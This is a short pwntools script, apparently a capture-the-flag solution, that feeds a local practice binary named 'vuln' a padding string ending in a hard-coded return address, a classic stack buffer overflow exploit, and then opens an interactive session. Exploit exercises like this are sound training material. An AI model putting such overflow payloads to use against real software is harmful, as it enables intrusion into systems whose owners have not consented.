#! /usr/bin/python3


from pwn import *

HOST = ''
PORT = ''

p = process('./vuln')

p.sendlineafter(b'Please enter your string: \n', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa\xf6\x91\x04\x08')
# print(p.recvline())
# print(p.recvline())
p.interactive()